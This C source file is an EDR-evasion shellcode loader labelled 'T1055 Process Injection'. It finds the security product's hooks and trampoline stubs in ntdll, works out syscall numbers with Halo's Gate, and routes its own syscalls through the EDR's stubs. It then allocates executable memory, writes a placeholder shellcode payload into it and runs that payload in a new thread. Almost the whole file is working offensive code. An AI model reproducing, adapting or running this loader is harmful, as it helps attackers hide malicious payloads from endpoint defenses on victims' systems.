/**
Editor: Thomas X Meng
T1055 Process Injection
EDR syscall (SPS version)
EDR syscall no.2

_NtAllocateVirtualMemory_stub:
    mov r10, rcx
    mov eax, 0x18
    mov r11, qword [rel sysAddrNtAllocateVirtualMemory]
    mov r12, [rel edrJumpAddressR11_15]
    jmp r12

added halo's gate support for finding syscall SSN
**/


#include <windows.h>  // Include the Windows API header
#include <stdio.h>
#include <winternl.h>
#include <psapi.h>
#include <stdint.h>
#include <string.h>

#pragma comment(lib, "psapi.lib")

// manually parse dll PE header
typedef struct {
    DWORD* names;
    DWORD* funcs;
    WORD* ords;
    DWORD numberOfNames;
    PBYTE base;
} ExportTable;

BOOL ParseExportTable(PVOID dllBase, ExportTable* out) {
    if (!dllBase || !out) return FALSE;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dllBase;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)dllBase + dos->e_lfanew);
    DWORD exportRVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (exportRVA == 0) return FALSE;

    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)dllBase + exportRVA);
    out->names = (DWORD*)((BYTE*)dllBase + exp->AddressOfNames);
    out->funcs = (DWORD*)((BYTE*)dllBase + exp->AddressOfFunctions);
    out->ords  = (WORD*)((BYTE*)dllBase + exp->AddressOfNameOrdinals);
    out->numberOfNames = exp->NumberOfNames;
    out->base = (PBYTE)dllBase;
    return TRUE;
}

// The type NTSTATUS is typically defined in the Windows headers as a long.
typedef long NTSTATUS;  // Define NTSTATUS as a long


// --- Function pointer typedefs for NT syscalls ---
typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS (NTAPI *NtWriteVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);

typedef NTSTATUS (NTAPI *NtCreateThreadEx_t)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID lpStartAddress,
    PVOID lpParameter,
    ULONG Flags,
    SIZE_T StackZeroBits,
    SIZE_T SizeOfStackCommit,
    SIZE_T SizeOfStackReserve,
    PVOID lpBytesBuffer
);


typedef NTSTATUS (NTAPI *NtWaitForSingleObject_t)(
    HANDLE Handle,
    BOOLEAN Alertable,
    PLARGE_INTEGER Timeout
);

// --- These will point to the syscall trampoline addresses ---
UINT_PTR sysAddrNtAllocateVirtualMemory;
UINT_PTR sysAddrNtWriteVirtualMemory;
UINT_PTR sysAddrNtCreateThreadEx;
UINT_PTR sysAddrNtWaitForSingleObject;
UINT_PTR callRax = 0;


// --- These are used to extract the syscall trampoline addresses ---
NtAllocateVirtualMemory_t NtAllocateVirtualMemory;
NtWriteVirtualMemory_t NtWriteVirtualMemory;
NtCreateThreadEx_t NtCreateThreadEx;
NtWaitForSingleObject_t pNtWaitForSingleObject;

#define MAX_HOOKED 16

typedef struct {
    const char* hooked_apis[MAX_HOOKED];
    UINT_PTR Hook_target_address[MAX_HOOKED];
    UINT_PTR syscall_redirect_addr[MAX_HOOKED];
    UINT_PTR edr_jmp_address[MAX_HOOKED];
    UINT_PTR edr_ret_address[MAX_HOOKED];
    UINT_PTR call_rax[MAX_HOOKED];
    UINT_PTR syscall_stub_addr[MAX_HOOKED];
    int count;
} HookTracking;


HookTracking g_hooks = { 0 };

PVOID DLLViaPEB(const wchar_t* DllNameToSearch);
void* GetFunctionAddress(const char* MyNtdllFunction, PVOID MyDLLBaseAddress);


// Finds a syscall stub matching: mov eax, <ssn> ; jmp qword ptr [rip+0]
// Stores the absolute address of 'mov eax, ssn' in matchAddr
BOOL MatchSyscallPattern(BYTE* region, SIZE_T size, UINT_PTR* matchAddr, int indexToMatch, DWORD ssn) {
    int foundCount = 0;
    for (SIZE_T i = 0; i < size - 16; i++) {
        // Check for exact pattern:
        // mov eax, ssn     => B8 XX XX XX XX
        // jmp [rip+0]      => FF 25 00 00 00 00
        if (region[i] == 0xB8 &&                                // opcode for mov eax, imm32
            *(DWORD*)&region[i + 1] == ssn &&                   // compare SSN
            region[i + 5] == 0xFF &&
            region[i + 6] == 0x25 &&
            *(DWORD*)&region[i + 7] == 0x00000000)              // disp32 = 0
        {


            // Additional check: ensure previous 3 bytes are mov r10, rcx (4C 8B D1)
            if (i < 3 || region[i - 3] != 0x4C || region[i - 2] != 0x8B || region[i - 1] != 0xD1)
                continue;

            if (foundCount == indexToMatch) {
                *matchAddr = (UINT_PTR)&region[i] - 3;  // start of the stub

                printf("[+] Found syscall stub pattern for SSN 0x%08X at offset 0x%zx\n", ssn, i);
                printf("    Bytes: ");
                for (int j = 0; j < 14; j++) {
                    printf("%02X ", region[i + j]);
                }
                printf("\n");

                UINT_PTR* targetAddrPtr = (UINT_PTR*)&region[i + 11];
                UINT_PTR absTarget = *targetAddrPtr;

                printf("    Assembly:\n");
                printf("        mov eax, 0x%08X\n", ssn);
                printf("        jmp qword ptr [rip + 0x0] ; RIP=0x%p\n", (void*)(*matchAddr + 5));
                printf("        qword ptr content (target address): 0x%p\n", (void*)absTarget);
                return TRUE;
            }
            foundCount++;
        }
    }
    return FALSE;
}




void PrintHookRegionInfo(uintptr_t jmpTarget) {
    MEMORY_BASIC_INFORMATION mbi = { 0 };
    if (VirtualQuery((LPCVOID)jmpTarget, &mbi, sizeof(mbi))) {
        DWORD p = mbi.Protect & 0xFF;
        if ((mbi.Type == MEM_PRIVATE) && (p == PAGE_EXECUTE_READ)) {
            printf("    [MEMORY BASE] 0x%p | EXECUTE_READ | PRIVATE\n", mbi.BaseAddress);
        } else {
            printf("    [MEMORY BASE] 0x%p | REJECTED | Prot: 0x%lx | Type: 0x%lx\n",
                   mbi.BaseAddress, mbi.Protect, mbi.Type);
        }
    } else {
        printf("    [MEMORY] VirtualQuery FAILED at 0x%p\n", (void*)jmpTarget);
    }
}



static HMODULE g_edrModule = NULL;
static const char* g_edrName = NULL;


void ScanEDRCallRAXStubs(HMODULE edrModule, int hookIndex, int occurrenceIndex) {
    if (!edrModule || hookIndex >= MAX_HOOKED) return;

    printf("[*] Scanning EDR module from: %p for 'call rax' stubs\r\n", edrModule);

    BYTE* base = (BYTE*)edrModule;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);

    IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (memcmp(sec->Name, ".text", 5) == 0) {
            BYTE* sectionStart = base + sec->VirtualAddress;
            DWORD sectionSize = sec->Misc.VirtualSize;

            int foundCount = 0;


            for (DWORD j = 0; j < sectionSize - 3; j++) {
                // Look for: 48 FF E0  --> jmp rax
                if (!g_hooks.call_rax[hookIndex] &&
                    sectionStart[j]     == 0x48 &&
                    sectionStart[j + 1] == 0xFF &&
                    sectionStart[j + 2] == 0xE0) {

                    if (foundCount == occurrenceIndex) {
                        g_hooks.call_rax[hookIndex] = (UINT_PTR)(sectionStart + j);
                        printf("[+] Found jmp rax stub at address: 0x%p\n", sectionStart + j);

                        return;
                    }

                    foundCount++;
                }
            // for (DWORD j = 0; j < sectionSize - 2; j++) {
            //     // Look for: FF D0  --> call rax
            //     if (!g_hooks.call_rax[hookIndex] &&
            //         sectionStart[j]     == 0xFF &&
            //         sectionStart[j + 1] == 0xD0) {

            //         if (foundCount == occurrenceIndex) {
            //             g_hooks.call_rax[hookIndex] = (UINT_PTR)(sectionStart + j);
            //             printf("[+] Found call rax stub at address: 0x%p\n", sectionStart + j);

            //             return;
            //         }

            //         foundCount++;

            //         // return;
            //         // Stop early if both stubs are already found
            //         // if (g_hooks.edr_ret_address[hookIndex]) return;
            //     }



                // Optionally also still locate the RET+INT3 padding
                // if (!g_hooks.edr_ret_address[hookIndex] &&
                //     sectionStart[j]     == 0xC3 &&
                //     sectionStart[j + 1] == 0xCC &&
                //     sectionStart[j + 2] == 0xCC &&
                //     sectionStart[j + 3] == 0xCC &&
                //     sectionStart[j + 4] == 0xCC) {

                //     g_hooks.edr_ret_address[hookIndex] = (UINT_PTR)(sectionStart + j);
                //     printf("[+] Found padded RET stub at address: 0x%p\n", sectionStart + j);

                //     if (g_hooks.call_rax[hookIndex]) return;
                // }
            }

            printf("[-] 'call rax' or padded RET not found in .text section\r\n");
            return;
        }
    }
    printf("[-] .text section not found in module\r\n");
}



const char* TraceUntilEDR(uintptr_t startAddress, HMODULE* outResolvedModule) {
    int maxDepth = 5;
    uintptr_t currentAddr = startAddress;

    static HMODULE cachedEDRMod = NULL;
    static char cachedEDRName[MAX_PATH] = {0};

    if (cachedEDRMod) {
        if (outResolvedModule) *outResolvedModule = cachedEDRMod;
        return cachedEDRName;
    }

    for (int i = 0; i < maxDepth; ++i) {
        printf("[+] Tracing from 0x%p: \n", (void*)currentAddr);
        PrintHookRegionInfo(currentAddr);

        for (int offset = 0; offset < 300; ++offset) {
            BYTE* p = (BYTE*)(currentAddr + offset);

            // FF 15 ?? ?? ?? ?? or FF 25 ?? ?? ?? ??
            if (p[0] == 0xFF && (p[1] == 0x15 || p[1] == 0x25)) {
                int32_t rel = *(int32_t*)(p + 2);
                uintptr_t rip = (uintptr_t)(p + 6);
                uintptr_t ptrToTarget = rip + rel;

                if (IsBadReadPtr((void*)ptrToTarget, sizeof(uintptr_t))) {
                    printf("[-] Bad pointer to target at 0x%p \n", (void*)ptrToTarget);
                    return "BAD_POINTER";
                }

                uintptr_t target = *(uintptr_t*)ptrToTarget;
                printf("[+] Actual control transfer target = 0x%p \n", (void*)target);

                MEMORY_BASIC_INFORMATION mbi;
                if (VirtualQuery((LPCVOID)target, &mbi, sizeof(mbi)) == 0) {
                    printf("[-] VirtualQuery failed on 0x%p \n", (void*)target);
                    return "INVALID_QUERY";
                }

                HMODULE mod = NULL;
                if (GetModuleHandleExA(
                        GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
                        (LPCSTR)target, &mod) && mod) {
                    cachedEDRMod = mod;
                    if (outResolvedModule) *outResolvedModule = mod;
                    GetModuleBaseNameA(GetCurrentProcess(), mod, cachedEDRName, sizeof(cachedEDRName));
                    printf("[!] Reached module: %s \n", cachedEDRName);
                    return cachedEDRName;
                }

                currentAddr = target;
                break;
            }
        }
    }

    return "UNKNOWN";
}



const char* IdentifySyscallFromNtdll(UINT_PTR addr, PVOID dllBase) {
    ExportTable exp;
    if (!ParseExportTable(dllBase, &exp)) return "UNKNOWN";

    for (DWORD i = 0; i < exp.numberOfNames; i++) {
        UINT_PTR funcVA = (UINT_PTR)(exp.base + exp.funcs[exp.ords[i]]);
        if (addr >= funcVA && addr < funcVA + 32) {
            return (char*)exp.base + exp.names[i];
        }
    }
    return "UNKNOWN";
}



// Halo's gate syscall
#define UP -32
#define DOWN 32
WORD GetsyscallNum(LPVOID addr) {


    WORD syscall = 0;

    if (*((PBYTE)addr) == 0x4c
        && *((PBYTE)addr + 1) == 0x8b
        && *((PBYTE)addr + 2) == 0xd1
        && *((PBYTE)addr + 3) == 0xb8
        && *((PBYTE)addr + 6) == 0x00
        && *((PBYTE)addr + 7) == 0x00) {

        BYTE high = *((PBYTE)addr + 5);
        BYTE low = *((PBYTE)addr + 4);
        syscall = (high << 8) | low;

        return syscall;

    }

    // Detects if 1st, 3rd, 8th, 10th, 12th instruction is a JMP
    if (*((PBYTE)addr) == 0xe9 || *((PBYTE)addr + 3) == 0xe9 || *((PBYTE)addr + 8) == 0xe9 ||
        *((PBYTE)addr + 10) == 0xe9 || *((PBYTE)addr + 12) == 0xe9) {

        for (WORD idx = 1; idx <= 500; idx++) {
            if (*((PBYTE)addr + idx * DOWN) == 0x4c
                && *((PBYTE)addr + 1 + idx * DOWN) == 0x8b
                && *((PBYTE)addr + 2 + idx * DOWN) == 0xd1
                && *((PBYTE)addr + 3 + idx * DOWN) == 0xb8
                && *((PBYTE)addr + 6 + idx * DOWN) == 0x00
                && *((PBYTE)addr + 7 + idx * DOWN) == 0x00) {
                BYTE high = *((PBYTE)addr + 5 + idx * DOWN);
                BYTE low = *((PBYTE)addr + 4 + idx * DOWN);
                syscall = (high << 8) | low - idx;

                return syscall;
            }
            if (*((PBYTE)addr + idx * UP) == 0x4c
                && *((PBYTE)addr + 1 + idx * UP) == 0x8b
                && *((PBYTE)addr + 2 + idx * UP) == 0xd1
                && *((PBYTE)addr + 3 + idx * UP) == 0xb8
                && *((PBYTE)addr + 6 + idx * UP) == 0x00
                && *((PBYTE)addr + 7 + idx * UP) == 0x00) {
                BYTE high = *((PBYTE)addr + 5 + idx * UP);
                BYTE low = *((PBYTE)addr + 4 + idx * UP);

                syscall = (high << 8) | low + idx;

                return syscall;

            }

        }

    }
}

PVOID findSyscallInstruction(const char* apiName, FARPROC pApi, int occurrence)
{
    if (!pApi) {
        printf("[-] Invalid function pointer passed for %s.\n", apiName);
        return NULL;
    }


    printf("[+] Searching for syscall #%d in %s @ %p\n", occurrence, apiName, pApi);

    const unsigned char syscall_pattern[] = { 0x0F, 0x05 }; //or also checks 0xC3 for ret 
    BYTE* addr = (BYTE*)pApi;
    BYTE* end  = addr + 0x100;

    int found = 0;
    while (addr <= end - sizeof(syscall_pattern)) {
        if (addr[0] == syscall_pattern[0] && addr[1] == syscall_pattern[1]) {
            found++;
            if (found == occurrence) {
                printf("[+] Found syscall #%d for %s at %p\n", occurrence, apiName, addr);

                // Identify actual syscall name based on location
                PVOID ntdllBase = DLLViaPEB(L"ntdll.dll");
                const char* resolvedApi = IdentifySyscallFromNtdll((UINT_PTR)addr, ntdllBase);
                printf("[+] Syscall instruction at %p belongs to API: %s\n", addr, resolvedApi);

                return addr;
            }
        }
        addr++;
    }

    printf("[-] Only found %d syscall(s), syscall #%d not found for %s\n", found, occurrence, apiName);
    return NULL;
}


UINT_PTR FindSyscallTrampoline(const char* apiName) {
    if (g_hooks.count >= MAX_HOOKED)
        return 0;


	const char libName[] = { 'n', 't', 'd', 'l', 'l', 0 };
    wchar_t wideLibName[32] = {0};

    for (int i = 0; libName[i] != 0; i++) {
        wideLibName[i] = (wchar_t)libName[i];
    }
    PVOID ntdllBase =  (PVOID)DLLViaPEB(wideLibName);
    
    if (!ntdllBase)
        return 0;

    BYTE* funcAddr = (BYTE*)GetFunctionAddress(apiName, ntdllBase);
    
    DWORD SSN_temp = GetsyscallNum((LPVOID)(uintptr_t)funcAddr);

    if (!funcAddr)
        return 0;

    if (funcAddr[0] == 0xE9) {
        int32_t relOffset = *(int32_t*)(funcAddr + 1);
        BYTE* jmpTarget = funcAddr + 5 + relOffset;

        // check the jmp target is of RX permission and is private memory region, thus confirm it has been injected into
        // our process. It should be initialised as RWX by some EDRs and later changed to RX by syscall from EDR. 
        PrintHookRegionInfo((uintptr_t)jmpTarget);
        
        if (!g_edrName) {
            g_edrName = TraceUntilEDR((uintptr_t)jmpTarget, &g_edrModule);
        }  

        if (g_edrModule && strcmp(g_edrName, "UNKNOWN") != 0) {
            printf("[+] Traced hook path to: %s \n", g_edrName);
            ScanEDRCallRAXStubs(g_edrModule, g_hooks.count,2);
        }


        MEMORY_BASIC_INFORMATION mbi = { 0 };
        if (!VirtualQuery((LPCVOID)jmpTarget, &mbi, sizeof(mbi)))
            return 0;

        if (mbi.Type == MEM_PRIVATE && (mbi.Protect & PAGE_EXECUTE_READ)) {
            UINT_PTR matchAddr = 0;
            int attempt = g_hooks.count;

            // print the region is of RX permission and is private memory region: 

            if (!MatchSyscallPattern((BYTE*)mbi.BaseAddress, mbi.RegionSize, &matchAddr, attempt, SSN_temp)) {
                if (!MatchSyscallPattern((BYTE*)mbi.BaseAddress, mbi.RegionSize, &matchAddr, 0, SSN_temp)) {
                    return 0;
                }
            }

            // UINT_PTR ptrToAbs = *(UINT_PTR*)(matchAddr + 6);
            // const char* resolved = IdentifySyscallFromNtdll(ptrToAbs, ntdllBase);

            printf("[+] Hooked API: %s\n", apiName);
            printf("[+] JMP Target Region: 0x%p\n", mbi.BaseAddress);
            printf("[+] Trampoline Syscall Stub Addr: 0x%p\n", (void*)matchAddr);
            // printf("[+] Absolute Syscall Instruction Addr: 0x%p --> %s\n", (void*)ptrToAbs, resolved);

            g_hooks.hooked_apis[g_hooks.count] = apiName;
            g_hooks.Hook_target_address[g_hooks.count] = (UINT_PTR)jmpTarget;
            g_hooks.syscall_redirect_addr[g_hooks.count] = matchAddr;
            g_hooks.count++;
            return matchAddr;
        }
    }

    for (int i = 0; i < g_hooks.count; ++i) {
        if (strcmp(g_hooks.hooked_apis[i], apiName) == 0) {
            return g_hooks.syscall_redirect_addr[i];
        }
    }

    // Direct fallback to scanning for syscall in original function
    // only being run if EDR does not inject a trampoline indirect syscall in our process
    int occurrence = 2; // Default to first occurrence
    PVOID syscallAddr = findSyscallInstruction(apiName, (FARPROC)funcAddr, occurrence);
    if (syscallAddr && occurrence == 1) {
        printf("[+] %s is not hooked. Using direct syscall at: %p\n", apiName, syscallAddr);
        return (UINT_PTR)syscallAddr; 
    } else if (syscallAddr) {
        printf("[+] Using spoofed syscall at: %p\n", syscallAddr);
        return (UINT_PTR)syscallAddr; 
    }

    printf("[-] Failed to locate trampoline or syscall instruction for %s\n", apiName);

    return 0;
}



BOOL IsApiHooked(const char* apiName) {
    for (int i = 0; i < g_hooks.count; ++i) {
        if (strcmp(g_hooks.hooked_apis[i], apiName) == 0)
            return TRUE;
    }
    return FALSE;
}



void* DLLViaPEB(const wchar_t* DllNameToSearch) {
#ifdef _M_X64
    PPEB pPEB = (PPEB)__readgsqword(0x60);
#else
    PPEB pPEB = (PPEB)__readfsdword(0x30);
#endif
    PLIST_ENTRY head = &pPEB->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY current = head->Flink;

    while (current != head) {
        PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY)((BYTE*)current - sizeof(LIST_ENTRY));
        if (wcsstr(entry->FullDllName.Buffer, DllNameToSearch))
            return entry->DllBase;
        current = current->Flink;
    }
    return NULL;
}



void* GetFunctionAddress(const char* funcName, PVOID dllBase) {
    ExportTable exp;
    if (!ParseExportTable(dllBase, &exp)) return NULL;

    for (DWORD i = 0; i < exp.numberOfNames; i++) {
        const char* name = (char*)exp.base + exp.names[i];
        if (strcmp(name, funcName) == 0) {
            DWORD funcRVA = exp.funcs[exp.ords[i]];
            return exp.base + funcRVA;
        }
    }
    return NULL;
}




// --- Externs from NASM file: indirect_syscall.asm ---
#ifdef __cplusplus
extern "C" {
#endif

extern void _NtAllocateVirtualMemory_stub(void);
extern void _NtWriteVirtualMemory_stub(void);
extern void _NtCreateThreadEx_stub(void);
extern void _NtWaitForSingleObject_stub(void);

extern void _NtAllocateVirtualMemory_stub_nothooked(void);
extern void _NtWriteVirtualMemory_stub_nothooked(void);
extern void _NtCreateThreadEx_stub_nothooked(void);
extern void _NtWaitForSingleObject_stub_nothooked(void);

#ifdef __cplusplus
}
#endif

#define CALL_API_WITH_HOOK_CHECK(api, type, hooked, nothooked, ...) \
    (IsApiHooked(#api) ? ((type)(hooked))(__VA_ARGS__) : ((type)(nothooked))(__VA_ARGS__))



unsigned char magiccode[] = ####SHELLCODE####;



int main(int argc, char *argv[]) {


    PVOID allocBuffer = NULL;   
    SIZE_T buffSize = sizeof(magiccode);   
    SIZE_T regionSize = buffSize;


    // Get a handle to the ntdll.dll library
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");///
    if (hNtdll == NULL) {
         printf("[-] Error: ntdll could not be found.");
        return 1;  
    }     

    printf("[!] EDR syscall-2 loader started.\n");

    // Dynamically resolve NT functions
    NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    NtWriteVirtualMemory = (NtWriteVirtualMemory_t)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    NtCreateThreadEx = (NtCreateThreadEx_t)GetProcAddress(hNtdll, "NtCreateThreadEx");
    pNtWaitForSingleObject = (NtWaitForSingleObject_t)GetProcAddress(hNtdll, "NtWaitForSingleObject");

    if (!NtAllocateVirtualMemory || !NtWriteVirtualMemory || !NtCreateThreadEx || !pNtWaitForSingleObject) {
        printf("[-] Error: Failed to resolve one or more Nt* functions.\n");
        return 1;
    }

    // Calculate syscall trampoline addresses    
    // sysAddrNtAllocateVirtualMemory = (UINT_PTR)NtAllocateVirtualMemory + 0x12;
    sysAddrNtAllocateVirtualMemory = FindSyscallTrampoline("NtAllocateVirtualMemory");

    printf("[+] EDR \"NtAllocateVirtualMemory\" address: 0x%p\n", (void*)sysAddrNtAllocateVirtualMemory);
    callRax = g_hooks.call_rax[0];
    printf("[+] EDR \"call rax\" address: 0x%p\n", (void*)callRax);


    printf("[+] press any key to continue...\n");
    getchar();


    // sysAddrNtWriteVirtualMemory = (UINT_PTR)NtWriteVirtualMemory + 0x12;
    sysAddrNtWriteVirtualMemory = FindSyscallTrampoline("NtWriteVirtualMemory");
    printf("[+] EDR \"NtWriteVirtualMemory\" address: 0x%p\n", (void*)sysAddrNtWriteVirtualMemory);
    sysAddrNtCreateThreadEx = (UINT_PTR)NtCreateThreadEx + 0x12;
    sysAddrNtCreateThreadEx = FindSyscallTrampoline("NtCreateThreadEx");
    printf("[+] EDR \"NtCreateThreadEx\" address: 0x%p\n", (void*)sysAddrNtCreateThreadEx);
    sysAddrNtWaitForSingleObject = (UINT_PTR)pNtWaitForSingleObject + 0x12;




    // Call NASM syscall stubs
    // NTSTATUS status = ((NtAllocateVirtualMemory_t)_NtAllocateVirtualMemory_stub)(
    //     (HANDLE)-1,
    //     (PVOID*)&allocBuffer,
    //     0,
    //     &buffSize,
    //     MEM_COMMIT | MEM_RESERVE,
    //     PAGE_EXECUTE_READWRITE
    // );

    // NTSTATUS status = CALL_API_WITH_HOOK_CHECK(
    //     NtAllocateVirtualMemory,
    //     NtAllocateVirtualMemory_t,
    //     _NtAllocateVirtualMemory_stub,
    //     _NtAllocateVirtualMemory_stub_nothooked,
    //     (HANDLE)-1,
    //     (PVOID*)&allocBuffer,
    //     0,
    //     &buffSize,
    //     MEM_COMMIT | MEM_RESERVE,
    //     PAGE_EXECUTE_READWRITE
    // );

    NTSTATUS status = 0;
    if (IsApiHooked("NtAllocateVirtualMemory")) {
        printf("[+] NtAllocateVirtualMemory is hooked.\n");
        status = ((NtAllocateVirtualMemory_t)_NtAllocateVirtualMemory_stub)(
            (HANDLE)-1,
            (PVOID*)&allocBuffer,
            0,
            &regionSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );
        printf("[+] Called hooked NtAllocateVirtualMemory stub.\n");
    } else {
        printf("[+] NtAllocateVirtualMemory is not hooked.\n");
        status = ((NtAllocateVirtualMemory_t)_NtAllocateVirtualMemory_stub_nothooked)(
            (HANDLE)-1,
            &allocBuffer,
            0,
            &regionSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );
        printf("[+] Called *unhooked* NtAllocateVirtualMemory stub.\n");
    }

    if (status != 0) {
        printf("[-] NtAllocateVirtualMemory failed with NTSTATUS: 0x%lx\n", status);
        return 1;
    }
    printf("[+] Memory allocated at: %p\n", allocBuffer);

    // -------------------------------------------------------

    SIZE_T bytesWritten = 0;
    printf("[+] Writing magiccode via NtWriteVirtualMemory...\n");


    if (IsApiHooked("NtWriteVirtualMemory")) {
        status = ((NtWriteVirtualMemory_t)_NtWriteVirtualMemory_stub)(
            GetCurrentProcess(),
            allocBuffer,
            magiccode,
            sizeof(magiccode),
            &bytesWritten
        ); 
        } else { 
        status = ((NtWriteVirtualMemory_t)_NtWriteVirtualMemory_stub_nothooked)(
            GetCurrentProcess(),
            allocBuffer,
            magiccode,
            sizeof(magiccode),
            &bytesWritten
        );
    }

    if (status != 0) {
        printf("[-] NtWriteVirtualMemory failed. NTSTATUS: 0x%lx, Bytes Written: %lu\n", status, bytesWritten);
        return 1;
    }
    printf("[+] Wrote %lu bytes to allocated memory\n", bytesWritten);


    printf("[+] Magiccode is located at: %p\n", allocBuffer);
    printf("[+] Press any key to continue...\n");
    getchar();

    // -------------------------------------------------------

    HANDLE hThread = NULL;
    printf("[+] Creating remote thread via NtCreateThreadEx...\n");

    status = ((NtCreateThreadEx_t)_NtCreateThreadEx_stub_nothooked)(
        &hThread,
        GENERIC_EXECUTE,
        NULL,
        GetCurrentProcess(),
        (PVOID)(uintptr_t)allocBuffer,
        NULL,
        FALSE,
        0,
        0,
        0,
        NULL
    );

    if (status != 0 || hThread == NULL) {
        printf("[-] NtCreateThreadEx failed with NTSTATUS: 0x%lx\n", status);
        return 1;
    }
    printf("[+] Thread created successfully. Handle: %p\n", hThread);

    // -------------------------------------------------------

    printf("[+] Waiting for thread to complete via NtWaitForSingleObject...\n");

    status = ((NtWaitForSingleObject_t)_NtWaitForSingleObject_stub_nothooked)(
        hThread,
        FALSE,
        NULL
    );

    if (status != 0) {
        printf("[-] NtWaitForSingleObject failed with NTSTATUS: 0x%lx\n", status);
        return 1;
    }
    printf("[+] Thread has finished execution.\n");
    return 0;

}

